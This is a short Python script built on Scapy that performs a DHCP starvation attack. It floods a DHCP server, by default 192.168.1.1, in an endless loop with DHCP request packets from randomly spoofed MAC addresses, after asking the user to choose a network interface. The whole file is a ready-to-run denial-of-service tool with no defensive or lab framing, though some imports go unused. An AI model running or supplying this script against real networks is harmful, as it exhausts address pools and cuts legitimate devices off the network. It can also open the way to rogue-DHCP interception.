from scapy.all import *
import random
import psutil
import socket
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether


def random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))


def dhcp_starvation(target_ip, interface):
    conf.iface = interface
    while True:
        mac = random_mac()
        dhcp_request_packet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                              IP(src="0.0.0.0", dst=target_ip) / \
                              UDP(sport=68, dport=67) / \
                              BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=random.randint(1, 1000000)) / \
                              DHCP(options=[("message-type", "request"),
                                            ("server_id", target_ip),
                                            ("requested_addr", "0.0.0.0"),
                                            "end"])
        sendp(dhcp_request_packet, iface=interface, verbose=3)


def list_interfaces():
    """
    List all available network interfaces using Scapy.
    """
    print("Available interfaces:")
    for index, iface in enumerate(conf.ifaces):
        print(f"Index: {index}, Name: {conf.ifaces[iface].name}")


if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with the DHCP server IP address
    list_interfaces()
    selected_index = input("Please enter the interface index you want to use: ")

    if selected_index.isdigit():
        selected_index = int(selected_index)
        if selected_index < len(conf.ifaces):
            selected_interface = list(conf.ifaces.keys())[selected_index]
            interface_name = conf.ifaces[selected_interface].name
            print(f"Using interface {interface_name} for DHCP Starvation attack.")
            dhcp_starvation(target_ip, interface_name)
        else:
            print("Invalid interface index selected.")
    else:
        print("Invalid input. Please enter a valid interface index.")
